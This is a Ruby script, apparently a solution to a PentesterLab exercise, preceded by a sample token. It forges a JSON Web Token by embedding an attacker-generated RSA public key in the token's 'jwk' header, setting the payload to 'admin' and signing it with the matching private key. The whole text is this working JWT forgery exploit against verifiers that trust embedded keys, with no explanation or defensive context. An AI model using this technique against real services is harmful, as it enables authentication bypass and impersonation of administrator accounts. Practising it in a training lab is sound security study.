#eyJhbGciOiJSUzI1NiIsImtpZCI6InIxMFYyU2lFMjRudGJ2QlJkcWpSUHc2Mnl5bU00WG9FUjJaRjY4Q1ZzYWcifQ.dGVzdA.Wb0g22tayccer0vnTjdSJHFR1yFM59bLGp0eNyP4ZYaJJP034iLJaBwxOofYGyqxoWBD0rBitmF1ppP4mO6lJhXE1_CdlQ-sbEDauQb-VwHcAVUMKZxLFkVNF17YsMASbtyU9r9OiR-cxTaCHCzmVqVtclr7OdgT1Hnk8ddmu8swVr-xlRP6Z7BOQsftijRDao0UEEyCD6k_XUyeM3q-l_fcy2NcNvbRough-dDl5-HhQ9d87atChdd-8OgMnwbglMuEixjFh33M7O4tyUZ1tQfBt2VTdxkst5WfTzW8wKJIV1Sjc0xzybh2vvs-m8BvNNmDG2cCv3Aa4qKgyQEajQ

require 'openssl'
require 'base64'
require 'json'


priv = OpenSSL::PKey::RSA.new File.read 'private.pem'

pub = priv.public_key

n = Base64.urlsafe_encode64(pub.n.to_s(2)).gsub(/=+$/, "")
e = Base64.urlsafe_encode64(pub.e.to_s(2)).gsub(/=+$/, "")
header = {"alg": "RS256", "jwk" => {"kty" => "RSA", "kid" => "pentesterlab", "use" => "sig", "n" => n, "e" => e }}
payload = Base64.urlsafe_encode64("admin").gsub(/=+$/, "")

token = Base64.urlsafe_encode64(header.to_json).gsub(/=+$/,"")+"."+payload

sign = priv.sign("SHA256", token)

puts token +"."+Base64.urlsafe_encode64(sign).gsub(/=+$/,"")

